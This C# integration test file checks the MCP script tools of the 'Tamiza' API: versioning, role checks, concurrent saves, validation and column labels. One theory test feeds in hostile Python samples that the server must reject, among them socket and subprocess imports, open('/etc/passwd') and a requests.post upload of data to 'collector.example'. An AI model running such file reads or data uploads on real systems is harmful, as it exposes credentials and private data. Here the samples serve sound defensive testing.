using System.Net.Http.Json;
using System.Text.Json;
using Tamiza.Api.Data;
using Tamiza.Api.IntegrationTests.Infrastructure;

namespace Tamiza.Api.IntegrationTests.Mcp;

[Collection(PostgresCollection.Name)]
public sealed class McpScriptToolsTests(PostgresFixture postgres)
{
    private const string Clean = "def clean(raw, ctx):\n    return raw\n";
    private const string Indicator = "import pandas as pd\n\ndef compute(cleaned, ctx):\n    return pd.DataFrame({'value': [1]})\n";

    private Task<McpProjectHarness> CreateAsync(McpAccess level = McpAccess.Aggregates) => McpProjectHarness.CreateAsync(postgres, level);

    private static object NewIndicator(string code = Indicator, int? baseVersion = null) =>
        new { kind = "indicator", name = "school_attendance", code, label = "School attendance", unit = "%", format = "percent", baseVersion };

    private HttpClient Rest(McpProjectHarness h, string person) => h.Factory.CreateClient().WithToken(TestTokens.Create(person, person, $"{person}@example.org"));

    [Fact]
    public async Task The_guide_gives_the_contract_and_the_templates_of_a_kind_to_an_analyst()
    {
        await using var h = await CreateAsync();

        using var body = (await h.CallAsync("analyst", "get_authoring_guide", new { kind = "indicator" }, withProject: false)).Json();

        Assert.Equal("indicator", body.RootElement.GetProperty("kind").GetString());
        var contract = body.RootElement.GetProperty("contract").GetString()!;
        Assert.Contains("compute(cleaned, ctx)", contract);
        Assert.Contains("numerator", contract);
        Assert.Contains("web addresses", contract);
        Assert.Equal(["count-by-group", "rate-by-group", "monthly-series"], body.RootElement.GetProperty("templates").EnumerateArray().Select(t => t.GetProperty("id").GetString()).ToArray());
    }

    [Fact]
    public async Task The_guide_needs_the_analyst_role_in_a_project_that_ai_clients_may_use()
    {
        await using var h = await CreateAsync(McpAccess.Off);

        // The analyst belongs to the only project, which is off.
        Assert.Equal("mcp.forbidden", (await h.CallAsync("analyst", "get_authoring_guide", new { kind = "clean" }, withProject: false)).Code());
        await h.SetLevelAsync(McpAccess.Aggregates);

        Assert.Null((await h.CallAsync("analyst", "get_authoring_guide", new { kind = "clean" }, withProject: false)).Code());
        Assert.Null((await h.CallAsync("superadmin", "get_authoring_guide", new { kind = "output" }, withProject: false)).Code());
        Assert.Equal("mcp.forbidden", (await h.CallAsync("viewer", "get_authoring_guide", new { kind = "clean" }, withProject: false)).Code());
        Assert.Equal("mcp.forbidden", (await h.CallAsync("outsider", "get_authoring_guide", new { kind = "clean" }, withProject: false)).Code());
        Assert.Equal("mcp.validation", (await h.CallAsync("analyst", "get_authoring_guide", new { kind = "dashboard" }, withProject: false)).Code());
    }

    [Fact]
    public async Task A_new_indicator_is_saved_as_version_one_by_the_analyst_and_marked_as_saved_through_mcp()
    {
        await using var h = await CreateAsync();

        using var saved = (await h.CallAsync("analyst", "save_script", NewIndicator())).Json();
        using var versions = JsonDocument.Parse(await Rest(h, "analyst").GetStringAsync($"/api/v1/projects/{h.ProjectId}/scripts/indicators/school_attendance/versions"));

        var s = saved.RootElement;
        Assert.Equal((true, 1, "School attendance", "percent"), (s.GetProperty("saved").GetBoolean(), s.GetProperty("version").GetInt32(), s.GetProperty("label").GetString(), s.GetProperty("format").GetString()));
        Assert.Equal("analyst", s.GetProperty("author").GetProperty("name").GetString());
        Assert.Equal("mcp", s.GetProperty("origin").GetString());
        Assert.DoesNotContain("import pandas", saved.RootElement.ToString());
        Assert.Equal("mcp", versions.RootElement[0].GetProperty("origin").GetString());
        Assert.Equal(h.Users["analyst"], Guid.Parse(versions.RootElement[0].GetProperty("author").GetProperty("id").GetString()!));
    }

    [Fact]
    public async Task A_version_saved_in_the_editor_is_marked_as_from_the_app()
    {
        await using var h = await CreateAsync();
        var rest = Rest(h, "analyst");

        Assert.True((await rest.PutAsJsonAsync($"/api/v1/projects/{h.ProjectId}/scripts/clean", new { code = Clean })).IsSuccessStatusCode);
        using var versions = JsonDocument.Parse(await rest.GetStringAsync($"/api/v1/projects/{h.ProjectId}/scripts/clean/versions"));

        Assert.Equal("app", versions.RootElement[0].GetProperty("origin").GetString());
    }

    [Fact]
    public async Task A_save_against_a_version_someone_else_replaced_is_refused_and_changes_nothing()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", NewIndicator());
        // Claude read version 1; an admin saves version 2 in the editor.
        var rest = Rest(h, "admin");
        Assert.True((await rest.PutAsJsonAsync($"/api/v1/projects/{h.ProjectId}/scripts/indicators/school_attendance",
            new { code = Indicator + "# changed\n", label = "School attendance", unit = "%", format = "percent" })).IsSuccessStatusCode);

        var stale = await h.CallAsync("analyst", "save_script", NewIndicator(Indicator + "# claude\n", baseVersion: 1));

        Assert.Equal("mcp.scriptChanged", stale.Code());
        using var body = stale.Json();
        var current = body.RootElement.GetProperty("current");
        Assert.Equal(2, current.GetProperty("version").GetInt32());
        Assert.Equal("admin", current.GetProperty("author").GetString());
        Assert.Contains("version is 2", stale.Text());
        Assert.Equal(2, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions WHERE name = 'school_attendance'"));
    }

    [Fact]
    public async Task Saving_without_a_base_version_over_an_existing_script_is_refused_too()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean });

        var result = await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean + "# again\n" });
        var current = await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean + "# again\n", baseVersion = 1 });

        Assert.Equal("mcp.scriptChanged", result.Code());
        Assert.Null(current.Code());
    }

    [Fact]
    public async Task Two_saves_from_the_same_version_at_the_same_time_leave_exactly_one_new_version()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean });

        var saves = await Task.WhenAll(
            h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean + "# one\n", baseVersion = 1 }),
            h.CallAsync("admin", "save_script", new { kind = "clean", code = Clean + "# two\n", baseVersion = 1 }));

        Assert.Equal(1, saves.Count(r => r.Code() is null));
        Assert.Equal(1, saves.Count(r => r.Code() == "mcp.scriptChanged"));
        Assert.Equal(2, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions WHERE kind = 'clean'"));
    }

    [Fact]
    public async Task A_script_can_be_read_listed_removed_and_restored_with_the_current_version_each_time()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", new { kind = "output", code = "def prepare_output(cleaned, ctx):\n    return cleaned\n" });
        await h.CallAsync("analyst", "save_script", new { kind = "output", code = "def prepare_output(cleaned, ctx):\n    return {}\n", baseVersion = 1 });

        using var one = (await h.CallAsync("analyst", "get_script", new { kind = "output", version = 1 })).Json();
        using var current = (await h.CallAsync("analyst", "get_script", new { kind = "output" })).Json();
        var removed = await h.CallAsync("analyst", "remove_script", new { kind = "output", baseVersion = 2 });
        using var listed = (await h.CallAsync("analyst", "list_scripts")).Json();
        var again = await h.CallAsync("analyst", "remove_script", new { kind = "output", baseVersion = 3 });
        var restored = await h.CallAsync("analyst", "restore_script_version", new { kind = "output", version = 1, baseVersion = 3 });
        using var versions = (await h.CallAsync("analyst", "list_script_versions", new { kind = "output" })).Json();

        Assert.Contains("return cleaned", one.RootElement.GetProperty("code").GetString());
        Assert.Equal(2, current.RootElement.GetProperty("number").GetInt32());
        Assert.Null(removed.Code());
        Assert.True(listed.RootElement.GetProperty("output").GetProperty("removed").GetBoolean());
        Assert.Equal(3, listed.RootElement.GetProperty("output").GetProperty("version").GetInt32());
        Assert.Equal("script.not_set", again.Code());
        Assert.Null(restored.Code());
        Assert.Equal([4, 3, 2, 1], versions.RootElement.GetProperty("versions").EnumerateArray().Select(v => v.GetProperty("number").GetInt32()).ToArray());
        Assert.All(versions.RootElement.GetProperty("versions").EnumerateArray(), v => Assert.Equal("mcp", v.GetProperty("origin").GetString()));
    }

    [Fact]
    public async Task A_removal_or_a_restore_against_a_stale_version_is_refused()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean });
        await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean + "# 2\n", baseVersion = 1 });

        Assert.Equal("mcp.scriptChanged", (await h.CallAsync("analyst", "remove_script", new { kind = "clean", baseVersion = 1 })).Code());
        Assert.Equal("mcp.scriptChanged", (await h.CallAsync("analyst", "restore_script_version", new { kind = "clean", version = 1, baseVersion = 1 })).Code());
        Assert.Equal(2, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions WHERE kind = 'clean'"));
    }

    [Fact]
    public async Task The_rules_of_the_editors_save_apply_to_a_save_through_mcp()
    {
        await using var h = await CreateAsync();

        var tooBig = await h.CallAsync("analyst", "save_script", new { kind = "clean", code = "# " + new string('x', 201 * 1024) });
        var badName = await h.CallAsync("analyst", "save_script", new { kind = "indicator", name = "Piped Water", code = Indicator, label = "L", format = "percent" });
        var badFormat = await h.CallAsync("analyst", "save_script", new { kind = "indicator", name = "rate", code = Indicator, label = "L", format = "ratio" });
        var noName = await h.CallAsync("analyst", "save_script", new { kind = "indicator", code = Indicator, label = "L", format = "percent" });
        var named = await h.CallAsync("analyst", "save_script", new { kind = "clean", name = "x", code = Clean });
        var blank = await h.CallAsync("analyst", "save_script", new { kind = "clean", code = "  " });
        var kind = await h.CallAsync("analyst", "save_script", new { kind = "dashboard", code = Clean });

        Assert.Contains("code: The script is larger than 200 KB", tooBig.Text());
        Assert.Contains("name:", badName.Text());
        Assert.Contains("format:", badFormat.Text());
        Assert.All(new[] { tooBig, badName, badFormat, noName, named, blank, kind }, r => Assert.Equal("mcp.validation", r.Code()));
        Assert.Equal(0, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions"));
    }

    [Fact]
    public async Task A_project_with_a_hundred_indicators_cannot_get_another_one_through_mcp()
    {
        await using var h = await CreateAsync();
        await TestData.ExecuteAsync(h.Db,
            "INSERT INTO tamiza.script_versions (id, project_id, kind, name, number, code, label, format, author_id, created_at) SELECT gen_random_uuid(), @p, 'indicator', 'ind_' || n, 1, 'x', 'L', 'count', @a, now() FROM generate_series(1, 100) n",
            ("p", h.ProjectId), ("a", h.Users["analyst"]));

        var result = await h.CallAsync("analyst", "save_script", NewIndicator());

        Assert.Equal("mcp.validation", result.Code());
        Assert.Contains("at most 100 indicators", result.Text());
    }

    [Theory]
    [InlineData("import socket\n\ndef clean(raw, ctx):\n    return raw\n", "import of socket")]
    [InlineData("from os import path\n\ndef clean(raw, ctx):\n    return raw\n", "import of os")]
    [InlineData("def clean(raw, ctx):\n    import subprocess\n    return raw\n", "import of subprocess")]
    [InlineData("def clean(raw, ctx):\n    eval('1')\n    return raw\n", "call of eval")]
    [InlineData("def clean(raw, ctx):\n    open('/etc/passwd')\n    return raw\n", "call of open")]
    [InlineData("def clean(raw, ctx):\n    x = __import__('os')\n    return raw\n", "call of __import__")]
    [InlineData("def clean(raw, ctx):\n    requests.post('https://collector.example/upload', data=raw)\n    return raw\n", "web address")]
    [InlineData("# see http://example.org\ndef clean(raw, ctx):\n    return raw\n", "web address")]
    public async Task Code_that_reaches_outside_the_script_is_refused_by_save_and_by_test_and_leaves_no_trace(string code, string found)
    {
        await using var h = await CreateAsync();

        var save = await h.CallAsync("analyst", "save_script", new { kind = "clean", code });
        var test = await h.CallAsync("analyst", "test_script", new { kind = "clean", code });

        Assert.Equal("mcp.unsafeCode", save.Code());
        Assert.Equal("mcp.unsafeCode", test.Code());
        Assert.Contains(found, save.Text());
        Assert.Equal(0, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions"));
        Assert.Equal(0, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_tests"));
    }

    [Fact]
    public async Task The_same_code_is_accepted_in_the_editor_and_a_restore_of_such_a_version_through_mcp_is_refused()
    {
        await using var h = await CreateAsync();
        const string code = "import socket\n\ndef clean(raw, ctx):\n    return raw\n";

        var rest = await Rest(h, "analyst").PutAsJsonAsync($"/api/v1/projects/{h.ProjectId}/scripts/clean", new { code });
        var restore = await h.CallAsync("analyst", "restore_script_version", new { kind = "clean", version = 1, baseVersion = 1 });

        Assert.True(rest.IsSuccessStatusCode);
        Assert.Equal("mcp.unsafeCode", restore.Code());
        Assert.Equal(1, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions"));
    }

    [Fact]
    public async Task Names_that_look_like_dangerous_calls_are_accepted()
    {
        await using var h = await CreateAsync();
        const string code = "import re\n\ndef clean(raw, ctx):\n    pattern = re.compile('a')\n    raw['main'].open_door = 1\n    reopen = raw['main'].evaluate()\n    return raw\n";

        Assert.Null((await h.CallAsync("analyst", "save_script", new { kind = "clean", code })).Code());
    }

    [Fact]
    public async Task A_viewer_can_read_and_write_no_script()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean });

        foreach (var (tool, args) in new (string, object)[]
                 {
                     ("list_scripts", new { }), ("get_script", new { kind = "clean" }), ("list_script_versions", new { kind = "clean" }),
                     ("save_script", new { kind = "clean", code = Clean, baseVersion = 1 }), ("remove_script", new { kind = "clean", baseVersion = 1 }),
                     ("restore_script_version", new { kind = "clean", version = 1, baseVersion = 1 }),
                 })
        {
            Assert.Equal("mcp.forbidden", (await h.CallAsync("viewer", tool, args)).Code());
        }

        Assert.Equal(1, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions"));
    }

    // Column labels through MCP (mcp-server: Indicator column labels through MCP)

    private static object Labelled(object? columns, int? baseVersion = null, string code = Indicator) =>
        new { kind = "indicator", name = "teatro_hoy", code, label = "Teatro hoy", format = "percent", baseVersion, columns };

    private static Dictionary<string, string?> LabelsOf(JsonElement element)
    {
        Assert.True(element.TryGetProperty("columns", out var columns), element.ToString());
        return columns.EnumerateObject().ToDictionary(c => c.Name, c => c.Value.GetProperty("label").GetString());
    }

    [Fact]
    public async Task Labels_saved_through_mcp_are_returned_by_the_save_the_script_and_the_indicators_list_and_seen_in_the_editor()
    {
        await using var h = await CreateAsync();

        using var saved = (await h.CallAsync("analyst", "save_script", Labelled(new
        {
            numerator = new { label = "Hogares que asistieron" },
            denominator = new { label = "Hogares" },
        }))).Json();
        using var script = (await h.CallAsync("analyst", "get_script", new { kind = "indicator", name = "teatro_hoy" })).Json();
        using var listed = (await h.CallAsync("viewer", "list_indicators")).Json();
        using var rest = JsonDocument.Parse(await Rest(h, "analyst").GetStringAsync($"/api/v1/projects/{h.ProjectId}/scripts/indicators/teatro_hoy/versions/1"));

        var expected = new Dictionary<string, string?> { ["numerator"] = "Hogares que asistieron", ["denominator"] = "Hogares" };
        Assert.Equal(expected, LabelsOf(saved.RootElement));
        Assert.Equal(expected, LabelsOf(script.RootElement));
        Assert.Equal(expected, LabelsOf(Assert.Single(listed.RootElement.GetProperty("indicators").EnumerateArray())));
        Assert.Equal(expected, LabelsOf(rest.RootElement));
    }

    [Fact]
    public async Task An_indicator_without_labels_returns_no_columns_member()
    {
        await using var h = await CreateAsync();

        using var saved = (await h.CallAsync("analyst", "save_script", NewIndicator())).Json();
        using var script = (await h.CallAsync("analyst", "get_script", new { kind = "indicator", name = "school_attendance" })).Json();
        using var listed = (await h.CallAsync("viewer", "list_indicators")).Json();

        Assert.False(saved.RootElement.TryGetProperty("columns", out _));
        Assert.False(script.RootElement.TryGetProperty("columns", out _));
        Assert.False(Assert.Single(listed.RootElement.GetProperty("indicators").EnumerateArray()).TryGetProperty("columns", out _));
    }

    [Fact]
    public async Task A_client_that_leaves_the_labels_out_keeps_those_of_the_version_before()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", Labelled(new { numerator = new { label = "Hogares que asistieron" } }));

        using var second = (await h.CallAsync("analyst", "save_script", Labelled(null, baseVersion: 1, code: Indicator + "# 2\n"))).Json();
        using var third = (await h.CallAsync("analyst", "save_script", new { kind = "indicator", name = "teatro_hoy", code = Indicator + "# 3\n", label = "Teatro hoy", format = "percent", baseVersion = 2 })).Json();

        Assert.Equal(new Dictionary<string, string?> { ["numerator"] = "Hogares que asistieron" }, LabelsOf(second.RootElement));
        Assert.Equal(new Dictionary<string, string?> { ["numerator"] = "Hogares que asistieron" }, LabelsOf(third.RootElement));
    }

    [Fact]
    public async Task Labels_given_replace_all_and_an_empty_set_clears_them()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", Labelled(new { numerator = new { label = "Hogares que asistieron" }, denominator = new { label = "Hogares" } }));

        using var replaced = (await h.CallAsync("analyst", "save_script", Labelled(new { comuna = new { label = "Comuna" } }, baseVersion: 1))).Json();
        using var cleared = (await h.CallAsync("analyst", "save_script", Labelled(new { }, baseVersion: 2))).Json();
        using var kept = (await h.CallAsync("analyst", "save_script", Labelled(null, baseVersion: 3))).Json();

        Assert.Equal(new Dictionary<string, string?> { ["comuna"] = "Comuna" }, LabelsOf(replaced.RootElement));
        Assert.False(cleared.RootElement.TryGetProperty("columns", out _));
        Assert.False(kept.RootElement.TryGetProperty("columns", out _));
        Assert.Equal(2, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions WHERE columns IS NULL"));
    }

    [Fact]
    public async Task A_label_refused_through_mcp_names_its_key_and_creates_no_version()
    {
        await using var h = await CreateAsync();

        var tooLong = await h.CallAsync("analyst", "save_script", Labelled(new { numerator = new { label = new string('a', 81) } }));
        var lineBreak = await h.CallAsync("analyst", "save_script", Labelled(new { numerator = new { label = "Hogares\nque asistieron" } }));
        var notAColumn = await h.CallAsync("analyst", "save_script", Labelled(new Dictionary<string, object> { ["Hogar Menores"] = new { label = "Hogares" } }));

        Assert.All(new[] { tooLong, lineBreak, notAColumn }, result => Assert.Equal("mcp.validation", result.Code()));
        Assert.Contains("columns.numerator.label", tooLong.Text());
        Assert.Contains("columns.numerator.label", lineBreak.Text());
        Assert.Contains("columns:", notAColumn.Text());
        Assert.Equal(0, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions"));
    }

    [Fact]
    public async Task Columns_sent_for_script_1_or_script_2_are_ignored()
    {
        await using var h = await CreateAsync();

        var clean = await h.CallAsync("analyst", "save_script", new { kind = "clean", code = Clean, columns = new { numerator = new { label = "Hogares" } } });
        var output = await h.CallAsync("analyst", "save_script", new { kind = "output", code = "def prepare_output(cleaned, ctx):\n    return cleaned\n", columns = new { numerator = new { label = "x".PadRight(200, 'x') } } });

        Assert.Null(clean.Code());
        Assert.Null(output.Code());
        using var body = clean.Json();
        Assert.False(body.RootElement.TryGetProperty("columns", out _));
        Assert.Equal(0, await TestData.ScalarAsync<long>(h.Db, "SELECT count(*) FROM tamiza.script_versions WHERE columns IS NOT NULL"));
    }

    [Fact]
    public async Task A_restore_through_mcp_brings_the_labels_of_the_version_back()
    {
        await using var h = await CreateAsync();
        await h.CallAsync("analyst", "save_script", Labelled(new { numerator = new { label = "Hogares que asistieron" } }));
        await h.CallAsync("analyst", "save_script", Labelled(new { }, baseVersion: 1));

        var restored = await h.CallAsync("analyst", "restore_script_version", new { kind = "indicator", name = "teatro_hoy", version = 1, baseVersion = 2 });

        using var body = restored.Json();
        Assert.Equal(new Dictionary<string, string?> { ["numerator"] = "Hogares que asistieron" }, LabelsOf(body.RootElement));
    }

    [Fact]
    public async Task A_version_or_script_that_does_not_exist_is_not_found_with_what_to_call()
    {
        await using var h = await CreateAsync();

        var script = await h.CallAsync("analyst", "get_script", new { kind = "clean" });
        var restore = await h.CallAsync("analyst", "restore_script_version", new { kind = "clean", version = 7, baseVersion = 0 });

        Assert.Equal("mcp.notFound", script.Code());
        Assert.Contains("list_scripts", script.Text());
        Assert.Equal("mcp.notFound", restore.Code());
    }
}
